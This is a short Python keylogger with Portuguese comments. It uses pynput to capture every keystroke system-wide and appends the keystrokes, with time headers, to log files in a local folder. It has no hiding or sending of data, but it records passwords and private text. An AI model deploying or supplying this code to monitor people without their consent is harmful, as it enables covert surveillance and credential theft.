from pynput import keyboard
import os
from datetime import datetime, timedelta

LOG_DIR = "logs"
timestamp_inicio = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
LOG_FILE = os.path.join(LOG_DIR, f"log_{timestamp_inicio}.txt")

# Variável para controlar o cooldown (inicia com um valor bem antigo)
ultima_digitacao = datetime.now() - timedelta(minutes=2)

IGNORED_KEYS = {
    keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
    keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.caps_lock
}

os.makedirs(LOG_DIR, exist_ok=True)

def write_log(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)

def on_press(key):
    global ultima_digitacao
    agora = datetime.now()

    # Verifica se passou mais de 1 minuto desde a última tecla
    if (agora - ultima_digitacao).total_seconds() > 60:
        horario_atual = agora.strftime("\n\n--- Registro em: %Y-%m-%d %H:%M:%S ---\n")
        write_log(horario_atual)
    
    ultima_digitacao = agora # Atualiza o marcador de tempo sempre que algo é digitado

    try:
        # Se for uma tecla comum, grava o caractere
        if key.char is not None:
            write_log(key.char)
    except AttributeError:
        # Teclas especiais
        if key == keyboard.Key.space:
            write_log(" ")
        elif key == keyboard.Key.enter:
            write_log("\n")
        elif key == keyboard.Key.tab:
            write_log("\t")
        elif key == keyboard.Key.backspace:
            write_log("[BACKSPACE]")
        elif key in IGNORED_KEYS:
            pass
        else:
            write_log(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
